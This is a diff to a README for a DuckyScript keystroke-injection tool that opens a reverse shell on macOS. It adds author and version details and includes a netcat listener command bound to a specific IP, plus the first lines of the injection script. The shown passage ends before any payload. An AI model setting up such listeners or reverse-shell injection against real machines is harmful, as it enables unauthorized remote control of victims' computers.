@@ -4,13 +4,17 @@ Duckyscript in a bash file to get a reverse shell on MacOS.
 ## DISCLAIMER:
 This is for security research purposes ONLY. Only use on machines where you have permission or your own.
 
+## About
+Version 1.0
+Author: samamsa7
+
 ## Setting up Listener
 Listener set up command for Windows.
 Run 
   nc -lvnp 87 -s 173.255.247.6
 in Powershell, replacing the IP and port with relevant ones.
 
-# DuckyScript Code
+## DuckyScript Code
 <code><pre>DELAY 50
 COMMAND SPACE
 DELAY 50
